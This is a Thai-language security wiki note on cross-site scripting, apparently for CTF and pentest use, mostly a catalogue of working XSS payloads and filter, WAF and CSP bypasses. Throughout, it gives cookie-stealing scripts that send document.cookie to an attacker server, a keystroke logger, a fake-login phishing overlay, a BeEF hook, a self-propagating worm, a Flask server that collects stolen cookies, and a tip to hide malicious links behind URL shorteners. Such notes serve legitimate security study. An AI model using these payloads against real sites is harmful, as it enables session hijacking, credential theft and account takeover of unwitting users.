#web 
# XSS (Cross-Site Scripting)

> [!TIP] การตรวจสอบ XSS อย่างรวดเร็ว
> ลอง payload พื้นฐาน: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `'"><svg/onload=alert(1)>` หรือใช้ [[XSStrike]] สำหรับการตรวจสอบอัตโนมัติ

## ❓ What
XSS (Cross-Site Scripting) เป็นช่องโหว่ที่เกิดจากการที่ web application รับ input จากผู้ใช้และแสดงผลบนหน้าเว็บโดยไม่มีการกรองหรือ encode อย่างเหมาะสม ทำให้ผู้โจมตีสามารถแทรก JavaScript code ที่เป็นอันตรายเข้าไปในหน้าเว็บได้ ส่งผลให้สามารถขโมย cookies, session tokens, redirect ผู้ใช้, หรือแก้ไข DOM ของหน้าเว็บได้

**ความเสี่ยงของ XSS:**
- ขโมย session cookies และ authentication tokens
- Keylogging - บันทึกการกดแป้นพิมพ์ของผู้ใช้
- Phishing - สร้างหน้า login ปลอมบนเว็บจริง
- Defacement - แก้ไขเนื้อหาหน้าเว็บ
- Browser exploitation - โจมตีผ่าน browser vulnerabilities
- Cryptocurrency mining - ใช้ CPU ของเหยื่อในการขุด crypto

**XSS กับ CTF:**
ใน CTF มักพบ XSS challenges ที่ต้องหา flag โดย:
- Steal admin cookies หรือ session
- Bypass CSP (Content Security Policy)
- DOM manipulation เพื่อเข้าถึงข้อมูลที่ซ่อนอยู่
- Exploit XSS bot ที่ admin ใช้เข้ามาดูหน้าเว็บ

**เทคนิคที่เกี่ยวข้อง:** [[🌐 Web application]], [[Authentication]], [[CSRF]]

## 🔍 Landmark (Detection)

### การตรวจหาช่องโหว่ XSS

1. **Reflection Detection** - ส่ง unique string เพื่อดูว่า input ถูก reflect กลับมาหรือไม่
```html
<!-- ส่ง input นี้ -->
test123xyz

<!-- ตรวจสอบใน HTML source ว่ามี test123xyz ปรากฏหรือไม่ -->
<!-- และอยู่ใน context ใด: HTML, attribute, JavaScript, CSS -->
```

2. **Basic Payload Testing** - ลองส่ง payload พื้นฐาน
```html
<!-- Payload พื้นฐานที่ใช้บ่อย -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'"><script>alert(1)</script>
```

3. **Context Analysis** - วิเคราะห์ว่า input อยู่ใน context ใด
```html
<!-- HTML Context -->
<div>USER_INPUT</div>

<!-- Attribute Context -->
<input value="USER_INPUT">

<!-- JavaScript Context -->
<script>var name = "USER_INPUT";</script>

<!-- URL Context -->
<a href="USER_INPUT">Click</a>
```

4. **Filter Detection** - ตรวจสอบว่ามี filter หรือ WAF หรือไม่
```html
<!-- ลองส่ง keywords ต่างๆ -->
<script>
<img>
onerror
javascript:
alert
document.cookie
```

> [!WARNING] ข้อผิดพลาดที่พบบ่อย
> - ไม่ได้ตรวจสอบ context ที่ input ถูกแทรกเข้าไป ทำให้ใช้ payload ผิด
> - ลืมเช็ค response ใน HTML source code มองแค่หน้าเว็บ
> - ไม่ URL encode payload เมื่อส่งผ่าน GET parameter

## 🟦 Types

### 1. Reflected XSS
XSS ที่ payload ถูกส่งผ่าน request (GET/POST) และถูก reflect กลับมาใน response ทันที โดยไม่ได้ถูกเก็บไว้ใน database

**ตัวอย่าง vulnerable code:**
```php
<?php
// Vulnerable - ไม่มีการ sanitize input
echo "Search results for: " . $_GET['q'];
?>
```

**การโจมตี:**
```html
<!-- ส่ง URL ที่มี payload ให้เหยื่อคลิก -->
http://<target_url>/search.php?q=<script>alert(document.cookie)</script>

<!-- เมื่อเหยื่อคลิกลิงก์ JavaScript จะ execute ใน browser ของเหยื่อ -->
```

**ลักษณะเด่น:**
- ไม่ถูกเก็บใน database
- ต้องหลอกให้เหยื่อคลิกลิงก์ที่มี payload
- ใช้เวลาสั้น one-time attack

### 2. Stored XSS (Persistent XSS)
XSS ที่ payload ถูกเก็บไว้ใน database และแสดงผลทุกครั้งที่มีการเข้าถึงหน้านั้น อันตรายที่สุดเพราะโจมตีผู้ใช้ทุกคนที่เข้ามาดูหน้านั้น

**ตัวอย่าง vulnerable code:**
```php
<?php
// บันทึก comment ลง database โดยไม่ sanitize
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");

// แสดง comments จาก database
$result = mysqli_query($conn, "SELECT text FROM comments");
while($row = mysqli_fetch_assoc($result)) {
    echo $row['text']; // Vulnerable - แสดงผลโดยไม่ encode
}
?>
```

**การโจมตี:**
```html
<!-- โพสต์ comment ที่มี payload -->
Nice article! <script>
fetch('http://<attacker_server>/steal?cookie='+document.cookie)
</script>

<!-- ทุกคนที่เข้ามาอ่าน comment จะถูกขโมย cookie -->
```

**ลักษณะเด่น:**
- ถูกเก็บถาวรใน database
- โจมตีผู้ใช้ทุกคนที่เข้าถึงหน้านั้น
- อันตรายมากกว่า Reflected XSS

### 3. DOM-based XSS
XSS ที่เกิดจาก client-side JavaScript manipulation โดย payload ไม่ผ่าน server แต่ถูก process โดย JavaScript ใน browser โดยตรง

**ตัวอย่าง vulnerable code:**
```javascript
// Vulnerable - ใช้ location.hash โดยตรง
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + name;
```

**การโจมตี:**
```html
<!-- URL ที่มี payload ใน fragment -->
http://<target_url>/page.html#<img src=x onerror=alert(document.cookie)>

<!-- JavaScript จะดึง fragment มาใส่ใน innerHTML โดยตรง -->
```

**ลักษณะเด่น:**
- ไม่ผ่าน server-side processing
- Payload อยู่ใน URL fragment (#) หรือ client-side storage
- ยากต่อการตรวจจับด้วย server-side security tools

**DOM XSS Sources & Sinks:**
```javascript
// Sources (แหล่งที่มาของ input)
location.href
location.hash
location.search
document.referrer
document.cookie
localStorage
sessionStorage

// Dangerous Sinks (ฟังก์ชันที่อันตราย)
innerHTML
outerHTML
document.write
eval()
setTimeout()
setInterval()
Function()
```

## 🔨 Exploitation

### Reflected XSS - Basic Payloads

**1. Basic Alert Box:**
```html
<!-- แสดง alert เพื่อยืนยันว่ามี XSS -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
```

**2. Cookie Stealing:**
```html
<!-- ส่ง cookie ไปยัง attacker server -->
<script>
fetch('http://<attacker_server>/steal?c='+document.cookie)
</script>

<!-- ใช้ Image tag -->
<script>
new Image().src='http://<attacker_server>/log?c='+document.cookie
</script>

<!-- Single line payload -->
<script>location='http://<attacker_server>/?c='+document.cookie</script>
```

**3. Keylogger:**
```html
<!-- บันทึกการกดแป้นพิมพ์ทั้งหมด -->
<script>
document.onkeypress = function(e) {
    fetch('http://<attacker_server>/keys?k='+e.key);
}
</script>
```

**4. Phishing Attack:**
```html
<!-- สร้างหน้า login ปลอม -->
<script>
document.body.innerHTML = '<h1>Session Expired</h1>' +
'<form action="http://<attacker_server>/phish" method="POST">' +
'Username: <input name="user"><br>' +
'Password: <input type="password" name="pass"><br>' +
'<input type="submit" value="Login">' +
'</form>';
</script>
```

### Reflected XSS - Advanced Payloads

**1. Breaking out of HTML Attributes:**
```html
<!-- Input อยู่ใน value attribute -->
<input value="USER_INPUT">

<!-- Payload: close attribute และแทรก event handler -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="

<!-- ผลลัพธ์ -->
<input value="" onmouseover="alert(1)">
```

**2. Breaking out of JavaScript String:**
```javascript
// Input อยู่ใน JavaScript string
<script>var name = "USER_INPUT";</script>

// Payload: ปิด string และแทรก code
"; alert(1); //
"; fetch('http://<attacker_server>/?c='+document.cookie); //

// ผลลัพธ์
<script>var name = ""; alert(1); //";</script>
```

**3. Event Handlers (without <script> tag):**
```html
<!-- ใช้ event handlers ต่างๆ เมื่อ <script> ถูก filter -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<iframe onload=alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1) open>
```

### Stored XSS - Basic Payloads

**1. Comment Section Attack:**
```html
<!-- Post comment ที่มี payload -->
Great post! <script>alert(1)</script>

<!-- หรือซ่อนใน attribute -->
<img src="valid.jpg" onload="alert(1)">
```

**2. Profile Field Attack:**
```html
<!-- ใส่ใน username หรือ bio -->
<script>
// ขโมย cookie ของทุกคนที่ดู profile
fetch('http://<attacker_server>/steal?victim='+document.cookie)
</script>
```

**3. Forum Post Attack:**
```html
<!-- โพสต์ที่มี payload ซ่อนอยู่ -->
Check this out: <iframe src="javascript:alert(1)"></iframe>
```

### Stored XSS - Advanced Payloads

**1. BeEF Hook (Browser Exploitation Framework):**
```html
<!-- Hook browser เพื่อ remote control -->
<script src="http://<attacker_server>:3000/hook.js"></script>

<!-- เมื่อเหยื่อเข้ามาดู attacker จะควบคุม browser ได้ -->
```

**2. Persistent Redirection:**
```html
<!-- Redirect ไปหน้า phishing -->
<script>
if(document.cookie.indexOf('admin')!==-1) {
    location='http://<attacker_server>/admin-phish.html';
}
</script>
```

**3. Self-Propagating XSS Worm:**
```html
<!-- XSS ที่แพร่กระจายเองเหมือน worm -->
<script>
// อ่าน payload ของตัวเอง
var payload = document.getElementById('xss-payload').innerHTML;

// โพสต์ comment ใหม่ที่มี payload เดียวกัน (ต้องมี CSRF)
fetch('/post-comment', {
    method: 'POST',
    body: 'comment=' + encodeURIComponent(payload)
});
</script>
<div id="xss-payload" style="display:none">
    <!-- payload ของตัวเอง -->
</div>
```

### DOM-based XSS - Basic Payloads

**1. Fragment Identifier Exploitation:**
```html
<!-- URL -->
http://<target_url>/page.html#<img src=x onerror=alert(1)>

<!-- Vulnerable code -->
<script>
document.write(location.hash.substring(1));
</script>
```

**2. postMessage Exploitation:**
```javascript
// Vulnerable receiver
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Attack code
<script>
window.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

### DOM-based XSS - Advanced Payloads

**1. AngularJS Template Injection:**
```html
<!-- AngularJS 1.x template injection -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- URL -->
http://<target_url>/page#{{7*7}}
<!-- ถ้าแสดง 49 แสดงว่ามี template injection -->
```

**2. jQuery Selector Sink:**
```javascript
// Vulnerable jQuery code
$(location.hash)

// Payload
http://<target_url>/page#<img src=x onerror=alert(1)>
```

## 🚪 Bypass Techniques

> [!TIP] เทคนิค Bypass Filter
> ลองใช้หลายเทคนิคร่วมกัน: case variation + encoding + obfuscation + alternative tags

### 1. Filter Bypass - Tag Alternatives

**เมื่อ `<script>` ถูก filter:**
```html
<!-- ใช้ tags อื่นแทน -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details ontoggle=alert(1) open>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
```

### 2. Filter Bypass - Case Variation

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
<SvG OnLoAd=alert(1)>
```

### 3. Filter Bypass - Encoding

**HTML Entity Encoding:**
```html
<!-- Encode ใน attribute -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Hex encoding -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**URL Encoding:**
```html
<!-- Encode ใน href -->
<a href="javascript:%61%6c%65%72%74%28%31%29">Click</a>

<!-- Double encoding -->
<a href="javascript:%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34">Click</a>
```

**Unicode Encoding:**
```html
<!-- JavaScript Unicode escape -->
<script>alert(1)</script>

<!-- ES6 Unicode -->
<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
```

### 4. Filter Bypass - Obfuscation

**String Concatenation:**
```javascript
// แทนที่จะใช้ alert(1) โดยตรง
<script>eval('ale'+'rt(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>[].constructor.constructor('alert(1)')()</script>
```

**Comment Injection:**
```html
<!-- แทรก comment ระหว่าง tag -->
<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>
<img src=x one<!---->rror=alert(1)>
```

**Whitespace & Newline:**
```html
<!-- ใช้ whitespace characters ต่างๆ -->
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>
<img
src=x
onerror=alert(1)>
```

### 5. CSP (Content Security Policy) Bypass

**JSONP Endpoint Abuse:**
```html
<!-- ถ้า CSP อนุญาต domain ที่มี JSONP endpoint -->
<script src="https://trusted-site.com/jsonp?callback=alert"></script>
```

**AngularJS CSP Bypass:**
```html
<!-- AngularJS template injection ผ่าน CSP -->
<div ng-app ng-csp>
{{$on.constructor('alert(1)')()}}
</div>
```

**Base Tag Injection:**
```html
<!-- เปลี่ยน base URL ของหน้าเว็บ -->
<base href="http://<attacker_server>/">

<!-- scripts ที่ใช้ relative path จะโหลดจาก attacker server -->
```

**Dangling Markup Injection:**
```html
<!-- ถ้า CSP block inline scripts แต่อนุญาต external resources -->
<img src='http://<attacker_server>/capture?
<!-- จะจับ HTML ต่อจากนี้ส่งไปยัง attacker -->
```

### 6. WAF Bypass Techniques

**Null Byte Injection:**
```html
<scri%00pt>alert(1)</scri%00pt>
<img src=x onerr%00or=alert(1)>
```

**Nested Tags:**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Alternative Event Handlers:**
```html
<!-- ใช้ event handlers ที่ไม่ค่อยมีคน filter -->
<body onpageshow=alert(1)>
<body onpagehide=alert(1)>
<body onbeforeunload=alert(1)>
<body onhashchange=alert(1)>
<svg><animate onbegin=alert(1)>
```

## 🛠️ Tool

### XSStrike
Tool automation สำหรับหาและ exploit XSS vulnerabilities

**การใช้งานพื้นฐาน:**
```bash
# Basic scan
python3 xsstrike.py -u "http://<target_url>/search?q=test"

# Crawl และ scan ทั้งเว็บ
python3 xsstrike.py -u "http://<target_url>" --crawl

# Custom payload file
python3 xsstrike.py -u "http://<target_url>/page?input=test" --file payloads.txt
```

### Burp Suite
[[Burp Suite]] ใช้สำหรับ:
- Intercept request และแทรก XSS payload
- Intruder - automated fuzzing ด้วย payload list
- Repeater - ทดสอบ payload ต่างๆ
- Scanner (Pro) - หา XSS โดยอัตโนมัติ

**Burp Intruder Payload List:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
'"><script>alert(1)</script>
javascript:alert(1)
```

### Browser Developer Tools
```javascript
// ใช้ Console เพื่อทดสอบ
document.cookie
localStorage
sessionStorage
document.domain

// ทดสอบ DOM manipulation
document.body.innerHTML = '<h1>XSS Test</h1>'
```

### Manual Testing Tools
```bash
# curl สำหรับส่ง payload
curl "http://<target_url>/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

# httpie - easier syntax
http "http://<target_url>/search?q=<script>alert(1)</script>"
```

## 💡 Related

เทคนิคที่เกี่ยวข้อง:
- [[🌐 Web application]] - ความรู้พื้นฐาน web security
- [[Authentication]] - XSS ใช้ขโมย session
- [[CSRF]] - มักใช้ร่วมกับ XSS
- [[SQL Injection]] - อาจมีทั้ง SQLi และ XSS ในเว็บเดียวกัน
- [[File Upload]] - upload HTML file ที่มี XSS

Tools:
- [[Burp Suite]] - manual testing และ intercept
- [[XSStrike]] - automated XSS scanner
- **BeEF** - Browser Exploitation Framework
- **DOMPurify** - library สำหรับ sanitize input (defensive)

## 📚 Example

### CTF Walkthrough: PicoCTF - "Ja</>vaScript Kiddie"

**ภาพรวม Challenge:**
- Web application ที่รับ input และแสดงผลโดยไม่มีการ sanitize
- มี admin bot ที่จะเข้ามาดูหน้าที่เรา submit
- เป้าหมาย: ขโมย cookie ของ admin เพื่อเข้าถึง flag

**Step 1: Reconnaissance**
```bash
# เข้าเว็บและทดสอบ input field
http://<target_url>/submit

# ลอง payload พื้นฐาน
<script>alert(1)</script>
# ผลลัพธ์: alert ขึ้น แสดงว่ามี XSS
```

**Step 2: Setup Cookie Stealer Server**
```python
# สร้าง simple server เพื่อรับ cookie
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('c')
    print(f'[+] Stolen cookie: {cookie}')
    with open('cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

**Step 3: Craft Payload**
```html
<!-- Payload ที่ส่ง cookie ไปยัง server ของเรา -->
<script>
fetch('http://<your_server>:8000/steal?c='+document.cookie)
</script>

<!-- ใช้ Image tag เพื่อไม่ให้เด่นชัด -->
<img src=x onerror="fetch('http://<your_server>:8000/steal?c='+document.cookie)">
```

**Step 4: Submit Payload**
```bash
# Submit payload ผ่าน form
curl -X POST http://<target_url>/submit \
  -d "message=<img src=x onerror=\"fetch('http://<your_server>:8000/steal?c='%2Bdocument.cookie)\">"

# รอ admin bot เข้ามาดู
```

**Step 5: Capture Cookie**
```bash
# ดู log จาก server
[+] Stolen cookie: flag=picoCTF{j4v45cr1pt_k1dd13_3xpl01t5}; session=abc123

# ใช้ cookie เข้าเว็บ
curl -b "flag=picoCTF{j4v45cr1pt_k1dd13_3xpl01t5}" http://<target_url>/admin
```

> [!TIP] Key Takeaways
> - Stored XSS มีอำนาจมากกว่า Reflected XSS เพราะโจมตีทุกคนที่เข้ามา
> - ใช้ external server เพื่อรับข้อมูลที่ขโมยมา
> - ใน CTF มักมี admin bot ที่จะเข้ามาดูหน้าที่เรา submit อัตโนมัติ

### Real-World Example: DOM-based XSS

**Scenario:** Single Page Application ที่ใช้ URL hash เพื่อ routing

**Vulnerable Code:**
```javascript
// app.js - vulnerable routing
function router() {
    var page = location.hash.substring(1);
    document.getElementById('content').innerHTML = 
        '<h1>Page: ' + page + '</h1>';
}

window.onhashchange = router;
router();
```

**Step 1: Identify Vulnerability**
```bash
# ทดสอบด้วย unique string
http://<target_url>/#test123

# เช็คใน DOM
# <div id="content"><h1>Page: test123</h1></div>
# input ถูกใส่ใน innerHTML โดยตรง
```

**Step 2: Craft Payload**
```html
<!-- Payload ที่ break out จาก h1 tag -->
http://<target_url>/#</h1><script>alert(1)</script>

<!-- หรือใช้ img tag -->
http://<target_url>/#</h1><img src=x onerror=alert(document.cookie)>
```

**Step 3: Cookie Stealing**
```html
<!-- Payload ที่ส่ง cookie -->
http://<target_url>/#</h1><script>
fetch('http://<attacker_server>/steal?c='+document.cookie)
</script>
```

**Step 4: Social Engineering**
```
# ส่ง link ให้เหยื่อคลิก (อาจใช้ URL shortener เพื่อซ่อน payload)
bit.ly/abc123
```

### Advanced Example: CSP Bypass via JSONP

**Scenario:** เว็บมี CSP แต่อนุญาต scripts จาก trusted domain

**CSP Policy:**
```
Content-Security-Policy: script-src 'self' https://api.trusted-site.com
```

**Step 1: Find JSONP Endpoint**
```bash
# หา JSONP endpoint บน trusted domain
https://api.trusted-site.com/data?callback=test

# Response
test({"data": "value"})
```

**Step 2: Exploit JSONP**
```html
<!-- ใช้ callback parameter เพื่อ execute arbitrary function -->
<script src="https://api.trusted-site.com/data?callback=alert"></script>

<!-- จะเป็น: alert({"data": "value"}) -->
```

**Step 3: Advanced Exploitation**
```html
<!-- เรียก constructor เพื่อ execute code -->
<script src="https://api.trusted-site.com/data?callback=constructor.constructor.call.bind(alert)(null,1)"></script>

<!-- หรือใช้้ Object.assign -->
<script src="https://api.trusted-site.com/data?callback=Object.assign.bind(null,location,{href:'http://attacker.com'})"></script>
```

### Mutation XSS (mXSS)

**Scenario:** Browser mutation ทำให้ bypass sanitization

**Vulnerable Code:**
```javascript
// Sanitize โดยใช้ DOMParser
function sanitize(input) {
    var parser = new DOMParser();
    var doc = parser.parseFromString(input, 'text/html');
    return doc.body.innerHTML;
}
```

**Step 1: Find Mutation**
```html
<!-- Payload ที่จะถูก mutate โดย browser -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- หลัง parse จะกลายเป็น -->
<noscript><p title="</noscript>
<img src=x onerror=alert(1)>
">
```

**Step 2: Exploit**
```html
<!-- Payload ที่ใช้ mutation -->
<svg><style><img src=x onerror=alert(1)></style>

<!-- Browser จะ parse ใหม่และ execute -->
```

---

**สรุป Key Concepts:**
1. **Context is King** - เข้าใจ context ที่ input ถูกแทรก (HTML/Attribute/JavaScript/URL)
2. **Reflected vs Stored vs DOM** - แต่ละประเภทมีวิธีโจมตีและความรุนแรงต่างกัน
3. **Bypass Techniques** - ใช้ encoding, obfuscation, alternative tags เมื่อมี filter
4. **CSP Bypass** - หา JSONP endpoint, base tag injection, dangling markup
5. **Real Impact** - Cookie stealing, phishing, keylogging, browser exploitation
6. **Defense** - Output encoding, CSP, HTTPOnly cookies, input validation
